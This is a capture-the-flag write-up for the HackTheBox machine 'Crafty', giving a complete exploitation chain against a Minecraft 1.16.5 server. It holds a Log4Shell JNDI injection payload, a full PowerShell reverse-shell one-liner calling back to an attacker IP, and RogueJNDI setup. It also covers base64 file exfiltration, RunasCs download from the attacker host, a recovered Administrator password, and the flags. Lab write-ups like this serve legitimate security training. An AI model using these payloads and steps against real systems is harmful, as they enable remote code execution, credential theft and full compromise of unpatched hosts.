# Crafty HTB Writeup - Complete Exploitation Guide

**Machine**: Crafty (HackTheBox)  
**Difficulty**: Easy  
**User Flag**: `5c2250aaedf8214d0fb74f0a01ba41ea`  
**Root Flag**: `5864b0acc245d69d04dedcae34d1eb1d`

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Vulnerability Identification](#vulnerability-identification)
3. [Exploitation Setup](#exploitation-setup)
4. [Initial Access (svc_minecraft)](#initial-access)
5. [Privilege Escalation](#privilege-escalation)
6. [Root Access](#root-access)

---

## Reconnaissance

### Initial Port Scan
Start with an Nmap scan to identify open ports and services:

```bash
nmap -sV -sC --reason -Pn 10.129.230.193
```

**Results:**
- Port 80: Microsoft IIS httpd 10.0 (redirects to `http://crafty.htb`)
- Port 25565: Minecraft server 1.16.5 (Protocol version 127)

### Add Domain to Hosts File
```bash
echo "10.129.230.193 crafty.htb" >> /etc/hosts
echo "10.129.230.193 play.crafty.htb" >> /etc/hosts
```

### Enumerate HTTP Service
```bash
curl -v http://crafty.htb
```

The site is a static landing page for a Minecraft server, referencing `play.crafty.htb` as the server address.

### Identify Minecraft Server Version
The Nmap scan already revealed **Minecraft 1.16.5 (Protocol 127)**, which is critical for the next phase.

---

## Vulnerability Identification

### Log4Shell (CVE-2021-44228)
Minecraft server version 1.16.5 is vulnerable to **Log4j JNDI injection**, a pre-authentication Remote Code Execution vulnerability. The server logs chat messages using a vulnerable Log4j version, which parses and executes JNDI lookup strings.

**Key Point**: No authentication required — we can send a crafted chat message from a Minecraft client to trigger the RCE.

---

## Exploitation Setup

### Prerequisites
You'll need three terminal tabs running simultaneously:

#### Tab 1: Netcat Listener (reverse shell catch)
```bash
nc -lvvp 4444
```

#### Tab 2: HTTP Server (serve malicious files)
```bash
cd /path/to/working/directory
python3 -m http.server 8081
```

Place these files in the directory:
- `nc64.exe` (Windows netcat binary)
- `RunasCs.exe` (privilege escalation tool)

#### Tab 3: RogueJNDI (malicious LDAP server)
Build RogueJNDI:
```bash
git clone https://github.com/veracode-research/rogue-jndi.git
cd rogue-jndi
mvn package
```

### Get Your Attack Machine IP
Identify the IP on the VPN tunnel (typically `tun0`):
```bash
ip a
```
In this case: `10.10.16.23`

---

## Initial Access

### Step 1: Download and Prepare Minecraft Client

Download a compatible CLI Minecraft client:
```bash
wget https://github.com/MCCTeam/Minecraft-Console-Client/releases/download/20231011-230/MinecraftClient-20231011-230-linux-x64
chmod +x MinecraftClient-20231011-230-linux-x64
```

### Step 2: Connect to Minecraft Server

```bash
./MinecraftClient-20231011-230-linux-x64 anything "" 10.129.230.193
```

At the password prompt, press Enter (offline mode, no auth required). You should receive:
```
[MCC] Server was successfully joined.
```

### Step 3: Launch RogueJNDI with Payload

In Tab 3, start the malicious LDAP server with an embedded PowerShell reverse shell command:

**Generate Base64-Encoded PowerShell Payload:**

```bash
PS_COMMAND='$client = New-Object System.Net.Sockets.TCPClient("10.10.16.23",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

echo -n "$PS_COMMAND" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0
```

Copy the output and launch RogueJNDI:

```bash
cd rogue-jndi
java -jar target/RogueJndi-1.1.jar --command "powershell.exe -enc <BASE64_STRING_HERE>" --hostname "10.10.16.23"
```

### Step 4: Send JNDI Payload from Minecraft Client

In the Minecraft Console Client, send the JNDI injection payload:

```
/send ${jndi:ldap://10.10.16.23:1389/o=reference}
```

### Step 5: Catch the Reverse Shell

In Tab 1, you should see a connection:
```
connect to [10.10.16.23] from crafty.htb [10.129.230.193] XXXXX
```

Test the shell:
```powershell
whoami
# Output: crafty\svc_minecraft
```

### Step 6: Grab User Flag

```powershell
type C:\users\svc_minecraft\Desktop\user.txt
# 5c2250aaedf8214d0fb74f0a01ba41ea
```

---

## Privilege Escalation

### Step 1: Locate the Custom Plugin

The Minecraft server runs a custom plugin that contains hardcoded credentials:

```powershell
cd C:\users\svc_minecraft\server\plugins
dir
```

You should see: `playercounter-1.0-SNAPSHOT.jar`

### Step 2: Exfiltrate the JAR via Base64

Copy to temp directory and encode:
```powershell
cd C:\windows\temp
copy C:\users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar .
[Convert]::ToBase64String([IO.File]::ReadAllBytes('playercounter-1.0-SNAPSHOT.jar')) | Out-File -Encoding ASCII b64.txt
type b64.txt
```

Copy the entire base64 output.

### Step 3: Decode JAR on Attack Machine

```bash
cat > /tmp/plugin_b64.txt << 'EOF'
<paste base64 output here>
EOF

cat /tmp/plugin_b64.txt | base64 -d > playercounter.jar
file playercounter.jar  # Verify: Java archive data (JAR)
```

### Step 4: Extract and Examine the JAR

```bash
unzip -q playercounter.jar -d extracted/
cd extracted/htb/crafty/playercounter/
strings Playercounter.class | grep -i "s67\|rcon\|password"
```

**Output:**
```
s67u84zKq8IXw
```

This is the **Administrator password** (password reuse vulnerability).

---

## Root Access

### Step 1: Download RunasCs on Target

Back in your reverse shell:

```powershell
cd C:\windows\temp
powershell -c "Invoke-WebRequest http://10.10.16.23:8081/RunasCs.exe -OutFile RunasCs.exe"
dir RunasCs.exe  # Verify download
```

### Step 2: Execute Command as Administrator

Use RunasCs to run a command with the Administrator credentials:

```powershell
.\RunasCs.exe -l 2 administrator s67u84zKq8IXw "cmd /c type C:\Users\Administrator\Desktop\root.txt"
```

**Output:**
```
5864b0acc245d69d04dedcae34d1eb1d
```

---

## Key Takeaways

### Vulnerabilities Exploited
1. **Log4Shell (CVE-2021-44228)**: Minecraft 1.16.5 vulnerability allowing pre-auth RCE via JNDI injection
2. **Hardcoded Credentials**: Custom Java plugin contains plaintext password
3. **Password Reuse**: RCON password is also the Administrator password

### Attack Chain
1. Enumerate Minecraft server version via Nmap
2. Connect unauthenticated Minecraft client
3. Inject JNDI payload via chat message → triggers Log4j parsing
4. RogueJNDI server returns malicious class → remote code execution
5. Obtain initial shell as `svc_minecraft`
6. Extract and decompile custom plugin JAR
7. Recover hardcoded Administrator credentials
8. Use RunasCs to escalate privileges
9. Read root flag as Administrator

### Tools Used
- **nmap**: Port scanning and service enumeration
- **Minecraft Console Client**: Connect to vulnerable server
- **RogueJNDI**: JNDI injection and malicious LDAP server
- **PowerShell**: Interactive reverse shell
- **certutil/base64**: Encode/decode binary exfiltration
- **RunasCs**: Privilege escalation without interactive session

---

## Troubleshooting

### PowerShell Reverse Shell Not Working
If the `-e cmd.exe` reverse shell fails, use the PowerShell-based payload with base64 encoding:
- The issue: some builds of ported Windows netcat don't support `-e` correctly
- Solution: Use RogueJNDI's `--command` with base64-encoded PowerShell payload instead

### RunasCs Download Fails (404)
- Ensure the HTTP server is running in the correct directory where `RunasCs.exe` is located
- Restart the HTTP server if needed: `pkill -f http.server && python3 -m http.server 8081`

### JAR Extraction Fails (corrupted zip)
- If base64 decoding produces a corrupted JAR, re-extract from the target machine
- Use `[Convert]::ToBase64String()` in PowerShell (more reliable than certutil)

### JNDI Callback Not Triggering
- Verify the Minecraft client sent the message (check `/send` command in MCC)
- Confirm RogueJNDI logs show HTTP requests from target IP
- Check firewall: ensure ports 1389 (LDAP) and 8000 (HTTP) are accessible from target

---

## Timeline

| Step | Duration | Description |
|------|----------|-------------|
| Reconnaissance | 5 min | Nmap scan, HTTP enumeration |
| Setup | 10 min | Clone/compile RogueJNDI, start services |
| Exploitation | 5 min | Connect client, send JNDI payload, catch shell |
| User Flag | 1 min | Read flag from Desktop |
| Priv Esc Setup | 10 min | Extract, decode, decompile JAR |
| Credential Recovery | 2 min | Find hardcoded password in bytecode |
| Root Access | 2 min | RunasCs + admin command |
| Total | ~35 min | Complete exploitation |

---

## References

- [Log4Shell Vulnerability Details](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [RogueJNDI GitHub](https://github.com/veracode-research/rogue-jndi)
- [Minecraft Console Client](https://github.com/MCCTeam/Minecraft-Console-Client)
- [RunasCs GitHub](https://github.com/antonioCoco/RunasCs)
